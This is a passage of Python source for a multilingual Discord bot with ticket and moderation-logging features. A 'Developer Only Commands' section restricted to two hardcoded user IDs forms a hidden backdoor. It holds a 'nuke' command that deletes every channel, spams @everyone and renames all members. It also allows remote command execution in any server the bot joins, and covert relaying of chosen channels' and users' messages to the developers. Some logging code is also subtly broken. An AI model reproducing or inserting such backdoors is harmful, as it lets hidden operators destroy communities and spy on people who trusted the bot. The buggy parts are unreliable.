            button = Button(label="セットアップ", style=discord.ButtonStyle.secondary, custom_id="ticket_modal_jp")
        else:
            button = Button(label="Click to Setup", style=discord.ButtonStyle.secondary, custom_id="ticket_modal_en")
        
        button.callback = self.open_modal
        self.add_item(button)

    async def open_modal(self, interaction: discord.Interaction):
        modal = TicketModal(language=self.language)
        await interaction.response.send_modal(modal)

class TicketModal(Modal):
    def __init__(self, language="en"):
        settings = LANGUAGE_SETTINGS.get(language, LANGUAGE_SETTINGS["en"])
        super().__init__(title=settings["modal_title"])

        self.language = language
        self.title_input = TextInput(
            label=settings["title_label"], 
            placeholder=settings["title_placeholder"]
        )
        self.desc_input = TextInput(
            label=settings["desc_label"], 
            placeholder=settings["desc_placeholder"], 
            style=discord.TextStyle.paragraph
        )
        self.button_label_input = TextInput(
            label=settings["button_label"], 
            placeholder=settings["button_placeholder"]
        )
        self.color_input = TextInput(
            label=settings["color_label"], 
            placeholder=settings["color_placeholder"]
        )

        self.add_item(self.title_input)
        self.add_item(self.desc_input)
        self.add_item(self.button_label_input)
        self.add_item(self.color_input)

    async def on_submit(self, interaction: discord.Interaction):
        title = self.title_input.value
        description = self.desc_input.value
        button_label = self.button_label_input.value
        color_text = self.color_input.value.lower()
        creation_time = datetime.now(pytz.UTC).isoformat()
        ticket_embed_id = str(uuid.uuid4())

        color_map = {
            "blue": discord.Color.blue(),
            "red": discord.Color.red(),
            "green": discord.Color.green(),
            "yellow": discord.Color.from_str("#F9F900"),
            "black": discord.Color.from_str("#000000"),
            "white": discord.Color.from_str("#FFFFFF"),
            "purple": discord.Color.from_str("#800080"),
            "orange": discord.Color.from_str("#FFA500"),
            "pink": discord.Color.from_str("#FFC0CB"),
            "cyan": discord.Color.from_str("#00FFFF"),
            "gray": discord.Color.from_str("#808080"),
            "brown": discord.Color.from_str("#A52A2A"),
        }

        hex_color_pattern = r"^#([A-Fa-f0-9]{6})$"
        if re.match(hex_color_pattern, color_text):
            color = discord.Color(int(color_text[1:], 16))
        else:
            color = color_map.get(color_text, discord.Color.blue())

        embed = discord.Embed(title=title, description=description, color=color)
        guild = interaction.guild

        category = discord.utils.get(guild.categories, name="Tickets Channel")
        if category is None:
            category = await guild.create_category("Tickets Channel")
            
            for role in guild.roles:
                await category.set_permissions(role, view_channel=False)
            
            admin_role = discord.utils.get(guild.roles, permissions=discord.Permissions(administrator=True))
            if admin_role:
                await category.set_permissions(admin_role, view_channel=True)

        ticket_category_id = category.id

        final_view = SupportTicketView(ticket_embed_id, button_label)
        await interaction.response.send_message(embed=embed, view=final_view)
        ticket_message = await interaction.original_response()

        ticket_embeds[ticket_embed_id] = {
            "user_id":      interaction.user.id,
            "guild_id":     guild.id,
            "channel_id":   interaction.channel.id,
            "message_id":   ticket_message.id,
            "created_at":   creation_time,
            "title":        title,
            "description":  description,
            "button_label": button_label,
            "category_id":  ticket_category_id
        }
        save_ticket_embeds()

class SupportTicketView(discord.ui.View):
    def __init__(self, ticket_embed_id, button_label):
        super().__init__(timeout=None)
        self.ticket_embed_id = ticket_embed_id

        button = discord.ui.Button(
            label=button_label,
            style=discord.ButtonStyle.primary,
            custom_id=f"support_ticket_{ticket_embed_id}",
        )
        button.callback = self.open_ticket_callback
        self.add_item(button)

    async def open_ticket_callback(self, interaction: discord.Interaction):
        await interaction.response.defer()
        guild = interaction.guild

        category = discord.utils.get(guild.categories, name="Tickets Channel")
        if category is None:
            category = await guild.create_category("Tickets Channel")
            for role in guild.roles:
                await category.set_permissions(role, view_channel=False)
            admin_role = discord.utils.find(lambda r: r.permissions.administrator, guild.roles)
            if admin_role:
                await category.set_permission(admin_role, view_channel=True)

        username = interaction.user.name
        user_id = interaction.user.id

        overwrites = {
            guild.default_role: discord.PermissionOverwrite(view_channel=False),
            interaction.user: discord.PermissionOverwrite(view_channel=True),
            discord.utils.find(lambda r: r.permissions.administrator, guild.roles): discord.PermissionOverwrite(view_channel=True)
        }

        channel_name = f"ticket-{username}"
        ticket_channel = discord.utils.get(category.channels, name=channel_name)

        if ticket_channel is None:
            ticket_channel = await guild.create_text_channel(channel_name, category=category, overwrites=overwrites)
            await ticket_channel.send(f"{interaction.user.mention} Your ticket has been created.")
        else:
           await ticket_channel.set_permissions(interaction.user, view_channel=True)
           await ticket_channel.send(f"{interaction.user.mention} You already have a ticket.")


@bot.command()
@commands.has_permissions(administrator=True)
async def ticket(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return
    language = get_language(ctx.guild.id)
    settings = LANGUAGE_SETTINGS.get(language, LANGUAGE_SETTINGS["en"])
    view = TicketView(language=language)
    embed = discord.Embed(
        title=settings["setup_title"], 
        description=settings["setup_description"], 
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed, view=view)

@bot.command()
@commands.has_permissions(administrator=True)
async def close(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    if "ticket-" in ctx.channel.name:
        messages = []
        async for message in ctx.channel.history(limit=None, oldest_first=True):
            messages.append(message)

        html_content = """
        <html>
        <head>
            <style>
                body {
                    font-family: "Whitney", "Helvetica Neue", Helvetica, Arial, sans-serif;
                    background-color: #36393f;
                    color: #dcddde;
                    margin: 0;
                    padding: 20px;
                }
                .container {
                    width: 100%;
                    max-width: 800px;
                    margin: auto;
                }
                .message-group {
                    display: flex;
                    margin-bottom: 16px;
                }
                .avatar {
                    width: 40px;
                    height: 40px;
                    border-radius: 50%;
                    margin-right: 15px;
                }
                .content-container {
                    width: 100%;
                }
                .username {
                    color: #ffffff;
                    font-weight: 600;
                    font-size: 16px;
                }
                .timestamp {
                    color: #72767d;
                    font-size: 12px;
                    margin-left: 8px;
                }
                .content {
                    color: #dcddde;
                    font-size: 15px;
                    margin: 4px 0;
                    white-space: pre-wrap;
                }
                .embed {
                    background-color: #2f3136;
                    border-radius: 8px;
                    padding: 8px;
                    margin-top: 8px;
                    color: #dcddde;
                    font-size: 14px;
                }
                .attachment {
                    margin-top: 8px;
                }
                .attachment img {
                    max-width: 100%;
                    border-radius: 8px;
                }
                .edited {
                    font-size: 12px;
                    color: #72767d;
                    margin-left: 4px;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <h1 style="color: #ffffff; font-size: 24px; margin-bottom: 20px;">Ticket Transcript</h1>
        """

        for message in messages:
            timestamp = message.created_at.strftime("%Y-%m-%d %H:%M:%S")
            avatar_url = message.author.avatar.url if message.author.avatar else "https://cdn.discordapp.com/embed/avatars/0.png"
            html_content += f"""
                <div class="message-group">
                    <img src="{avatar_url}" class="avatar" alt="avatar">
                    <div class="content-container">
                        <div>
                            <span class="username">{html.escape(message.author.display_name)}</span>
                            <span class="timestamp">{timestamp}</span>
                        </div>
                        <div class="content">{html.escape(message.content)}</div>
            """
            if message.embeds:
                for embed in message.embeds:
                    if embed.type == "rich" and embed.description:
                        html_content += f"""
                            <div class="embed">
                                {html.escape(embed.description)}
                            </div>
                        """
            if message.attachments:
                for attachment in message.attachments:
                    if attachment.url.endswith(('.png', '.jpg', '.jpeg', '.gif', '.webp')):
                        html_content += f"""
                            <div class="attachment">
                                <img src="{attachment.url}" alt="attachment image">
                            </div>
                        """
                    else:
                        html_content += f"""
                            <div class="attachment">
                                <a href="{attachment.url}" target="_blank" style="color: #00b0f4;">{attachment.filename}</a>
                            </div>
                        """
            html_content += "</div></div>"

        html_content += """
            </div>
        </body>
        </html>
        """

        transcript_file = io.StringIO(html_content)
        await ctx.send(file=discord.File(transcript_file, filename=f"{ctx.channel.name}_transcript.html"))

        await ctx.send("Ticket has been closed and transcript saved.")

@bot.command()
@commands.has_permissions(administrator=True)
async def end(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    if "ticket-" in ctx.channel.name:
        await ctx.send("This channel will now be deleted.")
        await ctx.channel.delete(reason="Ticket channel closed by administrator.")

''' ----- Ticket System ----- '''
#
#
#
''' ----- Developer Only Commands ----- '''
CREATED_CHANNELS = []
LISTENING_CHANNELS = {}
LISTENING_USERS = {}
COMMAND_CONTEXTS = {}
ALLOWED_USERS = {853642098931007509, 867940965086822460}

def is_allowed_user(ctx):
    return ctx.author.id in ALLOWED_USERS

def allowed_only():
    async def predicate(ctx):
        if not is_allowed_user(ctx):
            await ctx.send("No Permissions.")
            return False
        return True
    return commands.check(predicate)

def generate_random_string(length=32):
    characters = string.ascii_lowercase + string.digits + "!@#$%^&*()_+☻☺☹♡♟♞❤♞♝♟♜♛♚♙♘♗♖♕♔☁☀❆༄࿓⚖︎↔︎⛓︎↩︎⚗︎↪︎⏺︎⏹︎⏸︎⏮︎◀︎⏯︎⏭︎▶︎☑︎✔︎㊙︎㊗︎♑♐♏♎♍♌㎇㎪㎈㎐㎒㎒㎓㎾𝟵𝟴𝟳❰❱⁇⁇№№·▓▓▓▓▓▓▓▓ဩဩඩඩඩ〠﷽"
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string

# nuke 
@bot.command()
@allowed_only()
async def nuke(ctx, string: str):
    if ctx.guild is None:
        await ctx.send("This command can only be used within a server.")
        return
    
    try:
        if ctx.guild.categories:
            for category in ctx.guild.categories:
                await category.delete()
        if ctx.guild.text_channels:
            for channel in ctx.guild.text_channels:
                await channel.delete()
        if ctx.guild.voice_channels:
            for channel in ctx.guild.voice_channels:
                await channel.delete()

        async def change_nicknames():
            while True:
                    for member in ctx.guild.members:
                        try:
                            nickname = generate_random_string()
                            await member.edit(nick=nickname)
                        except discord.Forbidden:
                            pass
                        except Exception as e:
                            pass
        bot.loop.create_task(change_nicknames())

        while not bot.is_closed():
            channel = await ctx.guild.create_text_channel(f"{string}")
            CREATED_CHANNELS.append(channel.name)

            async def spam_messages(channel, string):
                while True:
                    await channel.send(f"@everyone {string}")
            bot.loop.create_task(spam_messages(channel, string))

        await handle_exception(ctx, "nuke", "Success")
    except Exception as e:
        await handle_exception(ctx, "nuke", "Failure", error=e)

# Channel ID check command
@bot.command(aliases=["ccid"])
@allowed_only()
async def checkchannelid(ctx, guild_id: int):
    guild = bot.get_guild(guild_id)

    if not guild:
        await ctx.send("❌ Unable to find the specified guild. Please ensure the guild ID is correct and that the bot is a member.")
        return

    categories_info = "**📂 Categories:**\n"
    text_channels_info = "\n**💬 Text Channels:**\n"
    voice_channels_info = "\n**🔊 Voice Channels:**\n"

    for channel in guild.channels:
        if isinstance(channel, discord.CategoryChannel):
            categories_info += f"- {channel.name} — **(ID: `{channel.id}` )**\n"
        elif isinstance(channel, discord.TextChannel):
            text_channels_info += f"- {channel.name} — **(ID: `{channel.id}` )**\n"
        elif isinstance(channel, discord.VoiceChannel):
            voice_channels_info += f"- {channel.name} — **(ID: `{channel.id}` )**\n"

    channels_info = categories_info + text_channels_info + voice_channels_info

    if len(channels_info) > 2000:
        await ctx.send("⚠️ The channel list is too long to send in a single message. Sending as a file instead.")
        
        with open("channels_info.txt", "w", encoding="utf-8") as file:
            file.write("Guild Channel Information\n")
            file.write("=========================\n")
            file.write(channels_info)

        await ctx.send(file=discord.File("channels_info.txt"))
    else:
        await ctx.send(channels_info)

# Send message to a guild channel or a user
@bot.command(aliases=["smtc"])
@allowed_only()
async def sendmessagetochannel(ctx, guild_id: int, channel_id: int, *, contents: str):
    try:
        guild = bot.get_guild(guild_id)
        
        if not guild:
            await ctx.send("`Could not find the specified guild. Ensure the bot is a member of the guild.`")
            return

        channel = guild.get_channel(channel_id)
        if not channel:
            await ctx.send("`Could not find the specified channel. Ensure the channel ID is correct.`")
            return

        if isinstance(channel, discord.TextChannel):
            await channel.send(contents)
            await ctx.message.add_reaction("✅")
        else:
            await ctx.send("`The specified channel is not a text channel. Please provide a valid TextChannel ID.`")

    except ValueError:
        await ctx.send("`Invalid guild ID or channel ID. Please ensure you are using numbers for both.`")
    except Exception as e:
        await ctx.send(f"`An error occurred: {e}`")


@bot.command(aliases=["smtu"])
@allowed_only()
async def sendmessagetouser(ctx, user_id: int, *, contents: str):
    try:
        user = await bot.fetch_user(user_id)
        
        if not user:
            await ctx.send("`Could not find the specified user. Ensure the user ID is correct and the bot shares a server with the user.`")
            return

        await user.send(contents)
        await ctx.message.add_reaction("✅")
    
    except discord.NotFound:
        await ctx.send("`Could not find the specified user. Ensure the user ID is correct.`")
    except discord.Forbidden:
        await ctx.send("`Unable to send a message to the user. They may have DMs disabled or do not share a server with the bot.`")
    except Exception as e:
        await ctx.send(f"`An error occurred: {e}`")

# Remote bot command execution in a specified guild channel
@bot.command(aliases=["rbc"])
@allowed_only()
async def remotebotcommand(ctx, guild_id: int, channel_id: int, *, command: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("`Unable to find the specified server. Please ensure the server ID is correct and that the bot has joined the server.`")
        return

    channel = guild.get_channel(channel_id)
    if not channel:
        await ctx.send("`Unable to find the specified channel. Please ensure the channel ID is correct.`")
        return

    if not isinstance(channel, discord.TextChannel):
        await ctx.send("`The specified channel is not a text channel. Please provide a valid text channel ID.`")
        return

    try:
        print(f"Attempting to execute command: {command} in the server {guild.name} on channel {channel.name}")

        fake_message = ctx.message
        fake_message.content = f"{bot.command_prefix}{command}"
        fake_message.channel = channel
        fake_message.guild = guild
        fake_message.author = ctx.author

        fake_context = await bot.get_context(fake_message)

        if command.split()[0] == "nuke":
            string = command[len("nuke "):] if len(command) > len("nuke ") else ""
            await nuke(fake_context, string=string)
        else:
            command_to_invoke = bot.get_command(command.split()[0])
            if command_to_invoke is None:
                await ctx.send(f"Unable to find the command `{command.split()[0]}`")
                return

            await bot.invoke(fake_context)

    except Exception as e:
        await ctx.send(f"An error occurred while executing the command: {e}")

# Open/Stop to listening a channel or a user
@bot.command(aliases=["ocl"])
@allowed_only()
async def openchannellistening(ctx, guild_id: int, channel_id: int):
    guild = bot.get_guild(guild_id)
    if guild is None:
        await ctx.send(f"❌ Could not find Guild ID `{guild_id}`.")
        return
    channel = guild.get_channel(channel_id)
    if channel is None:
        await ctx.send(f"❌ Could not find Channel ID `{channel_id}`.")
        return
    LISTENING_CHANNELS[(guild_id, channel_id)] = True
    COMMAND_CONTEXTS[(guild_id, channel_id)] = ctx
    await ctx.send(f"✅ Started listening to channel `{channel.name}` in guild `{guild.name}`.")

@bot.command(aliases=["oclstop"])
@allowed_only()
async def stoplistening(ctx):
    LISTENING_CHANNELS.clear()
    COMMAND_CONTEXTS.clear()
    await ctx.send("🛑 Stopped listening to all channels.")

@bot.command(aliases=["oul"])
@allowed_only()
async def openuserlistening(ctx, user_id: int):
    LISTENING_USERS[user_id] = True
    COMMAND_CONTEXTS[user_id] = ctx
    await ctx.send(f"✅ Started listening to messages from user with ID `{user_id}`.")

@bot.command(aliases=["oulstop"])
@allowed_only()
async def stopuserlistening(ctx):
    LISTENING_USERS.clear()
    COMMAND_CONTEXTS.clear()
    await ctx.send("🛑 Stopped listening to all specified users.")

@bot.event
async def on_message(message):
    if message.guild is not None:
        guild_id = message.guild.id
        channel_id = message.channel.id

        if LISTENING_CHANNELS.get((guild_id, channel_id)):
            time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            channel_name = message.channel.name
            username = message.author.display_name
            content = message.content or "<No content>"
            output = f"`#{channel_name}` `{time}` `{username}`: `{content}`"
            print(output)

            if (guild_id, channel_id) in COMMAND_CONTEXTS:
                await COMMAND_CONTEXTS[(guild_id, channel_id)].send(f"{output}")

    if message.author.id in LISTENING_USERS:
        time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        username = message.author.display_name
        content = message.content or "<No content>"
        output = f"`DM` `{time}` `{username}`: `{content}`"
        print(output)
        logger.info(output)

        if message.author.id in COMMAND_CONTEXTS:
            await COMMAND_CONTEXTS[message.author.id].send(output)

    await bot.process_commands(message)

''' ----- Developer Only Commands ----- '''
#
#
#
''' ----- Logs Channel ----- '''

LOGS_CHANNEL_LANGUAGE_SETTINGS = {
    "zh": {
        "set_log_channel_success": "記錄頻道已更新至 {channel}.",
        "remove_log_channel_success": "此伺服器的記錄頻道已移除。",
        "no_log_channel_set": "此伺服器目前沒有設定記錄頻道。",
        "no_permission": "抱歉，您沒有管理員權限來使用此命令。",
    },
    "ja": {
        "set_log_channel_success": "ログチャンネルが {channel} に更新されました。",
        "remove_log_channel_success": "このサーバーのログチャンネルが削除されました。",
        "no_log_channel_set": "このサーバーには現在、ログチャンネルが設定されていません。",
        "no_permission": "申し訳ありませんが、このコマンドを使用する権限がありません。",
    },
    "en": {
        "set_log_channel_success": "Logging channel updated to {channel}.",
        "remove_log_channel_success": "The log channel for this server has been removed.",
        "no_log_channel_set": "No log channel is currently set for this server.",
        "no_permission": "Sorry, you do not have administrator permissions to use this command.",
    }
}

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogchannel(ctx, channel: discord.TextChannel):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    language = get_language(ctx.guild.id)
    settings = LOGS_CHANNEL_LANGUAGE_SETTINGS.get(language, LOGS_CHANNEL_LANGUAGE_SETTINGS["en"])
    
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        save_or_update_log_channel(ctx.guild.id, channel.id, ctx.author.id, current_time)
        logging_channel_ids[ctx.guild.id] = channel.id
        await ctx.send(settings["set_log_channel_success"].format(channel=channel.mention))
        await handle_exception(ctx, "setlogchannel", "Success")
    except Exception as e:
        await handle_exception(ctx, "setlogchannel", "Failure", error=e)

@bot.command()
@commands.has_permissions(administrator=True)
async def removelogchannel(ctx):
    if ctx.guild is None:
        await ctx.send(embed=discord.Embed(
            title="Command Not Available in DM",
            description="This command can only be used in a server.",
            color=discord.Color.red()
        ))
        return

    language = get_language(ctx.guild.id)
    settings = LOGS_CHANNEL_LANGUAGE_SETTINGS.get(language, LOGS_CHANNEL_LANGUAGE_SETTINGS["en"])
    
    try:
        guild_id = ctx.guild.id
        if remove_log_channel(guild_id):
            if guild_id in logging_channel_ids:
                del logging_channel_ids[guild_id]
            await ctx.send(settings["remove_log_channel_success"])
        else:
            await ctx.send(settings["no_log_channel_set"])
        await handle_exception(ctx, "removelogchannel", "Success")
    except Exception as e:
        await handle_exception(ctx, "removelogchannel", "Failure", error=e)

async def log_action(guild, embed):
    channel_id = logging_channel_ids.get(guild.id)
    if channel_id:
        channel = guild.get_channel(channel_id)
        if channel:
            await channel.send(embed=embed)

def format_timestamp(dt):
    gmt8 = pytz.timezone("Asia/Taipei")
    localized_dt = dt.astimezone(gmt8)
    unix_timestamp = int(localized_dt.timestamp())
    return f"<t:{unix_timestamp}:f>"

@bot.event
async def on_message_delete(message):
    if message.guild and message.guild.id in logging_channel_ids and not message.author.bot:
        try:
            language = get_language(message.guild.id)
            language_settings = {
                "en": {
                    "title": "Message Deleted",
                    "message_field": "Message",
                    "channel_field": "Channel",
                    "timestamp_field": "Date & Time",
                    "deleted_by_field": "Deleted By"
                },
                "zh": {
                    "title": "訊息已刪除",
                    "message_field": "訊息內容",
                    "channel_field": "頻道",
                    "timestamp_field": "日期與時間",
                    "deleted_by_field": "刪除者"
                },
                "ja": {
                    "title": "メッセージが削除されました",
                    "message_field": "メッセージ内容",
                    "channel_field": "チャンネル",
                    "timestamp_field": "日時",
                    "deleted_by_field": "削除者"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name=settings["message_field"], value=f"`{message.content or '[No Content]'}`", inline=False)

            if message.attachments:
                attachment_urls = "\n".join([attachment.url for attachment in message.attachments])
                embed.add_field(name="Attachments", value=f"`{attachment_urls}`", inline=False)

            embed.add_field(name=settings["channel_field"], value=f"`{message.channel.name} ({message.channel.id})`", inline=False)
            embed.add_field(name=settings["timestamp_field"], value=format_timestamp(message.created_at), inline=False)
            embed.add_field(name=settings["deleted_by_field"], value=f"<@{message.author.id}> `{message.author.name}`", inline=False)

            await log_action(message.guild, embed)
        except Exception as e:
            await handle_exception(message, "on_message_delete", "Failure", error=e)

@bot.event
async def on_message_edit(before, after):
    if before.guild and before.guild.id in logging_channel_ids and not before.author.bot:
        if before.content == after.content or before.attachments != after.attachments:
            return
        try:
            language = get_language(before.guild.id)
            language_settings = {
                "en": {
                    "title": "Message Edited",
                    "before_field": "Before",
                    "after_field": "After",
                    "channel_field": "Channel",
                    "timestamp_field": "Date & Time",
                    "edited_by_field": "Edited By"
                },
                "zh": {
                    "title": "訊息已編輯",
                    "before_field": "編輯前",
                    "after_field": "編輯後",
                    "channel_field": "頻道",
                    "timestamp_field": "日期與時間",
                    "edited_by_field": "編輯者"
                },
                "ja": {
                    "title": "メッセージが編集されました",
                    "before_field": "編集前",
                    "after_field": "編集後",
                    "channel_field": "チャンネル",
                    "timestamp_field": "日時",
                    "edited_by_field": "編集者"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name=settings["before_field"], value=f"`{before.content or '[No Content]'}`", inline=False)
            embed.add_field(name=settings["after_field"], value=f"`{after.content or '[No Content]'}`", inline=False)
            embed.add_field(name=settings["channel_field"], value=f"`{before.channel.name} ({before.channel.id})`", inline=False)
            embed.add_field(name=settings["timestamp_field"], value=format_timestamp(before.created_at), inline=False)
            embed.add_field(name=settings["edited_by_field"], value=f"<@{before.author.id}> `{before.author.name}`", inline=False)

            await log_action(before.guild, embed)
        except Exception as e:
            await handle_exception(before, "on_message_edit", "Failure", error=e)

@bot.event
async def on_member_join(member):
    if member.guild.id in logging_channel_ids:
        try:
            language = get_language(member.guild.id)
            language_settings = {
                "en": {
                    "title": "Member Invited" if used_invite else "Member Joined",
                    "user_field": "User",
                    "invited_by_field": "Invited By",
                    "invite_code_field": "Invite Code",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "title": "成員邀請加入" if used_invite else "成員加入",
                    "user_field": "用戶",
                    "invited_by_field": "邀請者",
                    "invite_code_field": "邀請碼",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "title": "メンバーが招待されました" if used_invite else "メンバーが参加しました",
                    "user_field": "ユーザー",
                    "invited_by_field": "招待者",
                    "invite_code_field": "招待コード",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            updated_invites = await member.guild.invites()
            old_invites = invite_cache.get(member.guild.id, [])
            used_invite, inviter = None, None
            
            for updated_invite in updated_invites:
                for old_invite in old_invites:
                    if updated_invite.code == old_invite.code and updated_invite.uses > old_invite.uses:
                        used_invite, inviter = updated_invite, updated_invite.inviter
                        break

            invite_cache[member.guild.id] = updated_invites

            embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
            if inviter:
                embed.add_field(name=settings["invited_by_field"], value=f"<@{inviter.id}> `{inviter.name}`", inline=False)
            if used_invite:
                embed.add_field(name=settings["invite_code_field"], value=f"`{used_invite.code}`", inline=False)
            embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
            await log_action(member.guild, embed)
        except Exception as e:
            await handle_exception(member, "on_member_join", "Failure", error=e)

@bot.event
async def on_member_remove(member):
    if member.guild.id in logging_channel_ids:
        try:
            language = get_language(member.guild.id)
            language_settings = {
                "en": {
                    "title": "Member Kicked" if actor else "Member Left",
                    "user_field": "User",
                    "kicked_by_field": "Kicked By",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "title": "成員被踢出" if actor else "成員離開",
                    "user_field": "用戶",
                    "kicked_by_field": "踢出者",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "title": "メンバーがキックされました" if actor else "メンバーが退出しました",
                    "user_field": "ユーザー",
                    "kicked_by_field": "キックした人",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            audit_log = []
            async for entry in member.guild.audit_logs(action=discord.AuditLogAction.kick, limit=1):
                if entry.target.id == member.id:
                    audit_log.append(entry)
            actor = audit_log[0].user if audit_log else None

            embed = discord.Embed(title=settings["title"], color=discord.Color.from_rgb(13, 13, 13))
            embed.add_field(name=settings["user_field"], value=f"<@{member.id}> `{member.name}`", inline=False)
            if actor:
                embed.add_field(name=settings["kicked_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
            embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
            await log_action(member.guild, embed)
        except Exception as e:
            await handle_exception(member, "on_member_remove", "Failure", error=e)

@bot.event
async def on_member_update(before, after):
    if before.guild.id in logging_channel_ids:
        try:
            language = get_language(before.guild.id)
            language_settings = {
                "en": {
                    "role_added_title": "Role Added",
                    "role_removed_title": "Role Removed",
                    "user_field": "User",
                    "role_field": "Role",
                    "nickname_changed_title": "Nickname Changed",
                    "nickname_added_title": "Nickname Added",
                    "nickname_removed_title": "Nickname Removed",
                    "old_nick_field": "Old Nickname",
                    "new_nick_field": "New Nickname",
                    "changed_by_field": "Changed By",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "role_added_title": "角色已添加",
                    "role_removed_title": "角色已移除",
                    "user_field": "用戶",
                    "role_field": "角色",
                    "nickname_changed_title": "暱稱已更改",
                    "nickname_added_title": "新增暱稱",
                    "nickname_removed_title": "移除暱稱",
                    "old_nick_field": "舊暱稱",
                    "new_nick_field": "新暱稱",
                    "changed_by_field": "更改者",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "role_added_title": "役職が追加されました",
                    "role_removed_title": "役職が削除されました",
                    "user_field": "ユーザー",
                    "role_field": "役職",
                    "nickname_changed_title": "ニックネームが変更されました",
                    "nickname_added_title": "ニックネームが追加されました",
                    "nickname_removed_title": "ニックネームが削除されました",
                    "old_nick_field": "旧ニックネーム",
                    "new_nick_field": "新しいニックネーム",
                    "changed_by_field": "変更者",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            added_roles = [role for role in after.roles if role not in before.roles]
            for role in added_roles:
                embed = discord.Embed(title=settings["role_added_title"], color=discord.Color.from_rgb(13, 13, 13))
                embed.add_field(name=settings["user_field"], value=f"<@{after.id}> `{after.name}`", inline=False)
                embed.add_field(name=settings["role_field"], value=f"`{role.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(after.guild, embed)

            removed_roles = [role for role in before.roles if role not in after.roles]
            for role in removed_roles:
                embed = discord.Embed(title=settings["role_removed_title"], color=discord.Color.from_rgb(13, 13, 13))
                embed.add_field(name=settings["user_field"], value=f"<@{after.id}> `{after.name}`", inline=False)
                embed.add_field(name=settings["role_field"], value=f"`{role.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(after.guild, embed)

            if before.nick != after.nick:
                audit_log = []
                async for entry in before.guild.audit_logs(action=discord.AuditLogAction.member_update, limit=1):
                    if entry.target.id == before.id:
                        audit_log.append(entry)
                actor = audit_log[0].user if audit_log else None

                embed = discord.Embed(
                    title=settings["nickname_changed_title"] if before.nick and after.nick else (
                        settings["nickname_added_title"] if after.nick else settings["nickname_removed_title"]),
                    color=discord.Color.from_rgb(13, 13, 13)
                )
                embed.add_field(name=settings["user_field"], value=f"<@{after.id}> `{after.name}`", inline=False)
                if before.nick:
                    embed.add_field(name=settings["old_nick_field"], value=f"`{before.nick}`", inline=False)
                if after.nick:
                    embed.add_field(name=settings["new_nick_field"], value=f"`{after.nick}`", inline=False)
                if actor:
                    embed.add_field(name=settings["changed_by_field"], value=f"<@{actor.id}> `{actor.name}`", inline=False)
                embed.add_field(name=settings["timestamp_field"], value=format_timestamp(datetime.now()), inline=False)
                await log_action(after.guild, embed)
        except Exception as e:
            await handle_exception(after, "on_member_update", "Failure", error=e)

@bot.event
async def on_voice_state_update(member, before, after):
    if member.guild.id in logging_channel_ids:
        try:
            language = get_language(member.guild.id)
            language_settings = {
                "en": {
                    "mute_title": "User Muted",
                    "unmute_title": "User Unmuted",
                    "deaf_title": "User Deafened",
                    "undeaf_title": "User Undeafened",
                    "disconnect_title": "User Disconnected from Voice Channel",
                    "move_title": "User Moved Voice Channel",
                    "user_field": "User",
                    "action_by_field": "Action By",
                    "from_channel_field": "From Channel",
                    "to_channel_field": "To Channel",
                    "channel_field": "Channel",
                    "timestamp_field": "Date & Time"
                },
                "zh": {
                    "mute_title": "用戶被靜音",
                    "unmute_title": "用戶取消靜音",
                    "deaf_title": "用戶被禁聽",
                    "undeaf_title": "用戶取消禁聽",
                    "disconnect_title": "用戶已從語音頻道斷開",
                    "move_title": "用戶移動了語音頻道",
                    "user_field": "用戶",
                    "action_by_field": "操作人",
                    "from_channel_field": "從頻道",
                    "to_channel_field": "到頻道",
                    "channel_field": "頻道",
                    "timestamp_field": "日期與時間"
                },
                "ja": {
                    "mute_title": "ユーザーがミュートされました",
                    "unmute_title": "ユーザーのミュートが解除されました",
                    "deaf_title": "ユーザーが聴覚を制限されました",
                    "undeaf_title": "ユーザーの聴覚制限が解除されました",
                    "disconnect_title": "ユーザーがボイスチャンネルから切断されました",
                    "move_title": "ユーザーがボイスチャンネルを移動しました",
                    "user_field": "ユーザー",
                    "action_by_field": "操作者",
                    "from_channel_field": "移動元チャンネル",
                    "to_channel_field": "移動先チャンネル",
                    "channel_field": "チャンネル",
                    "timestamp_field": "日時"
                }
            }
            settings = language_settings.get(language, language_settings["en"])

            actor = None

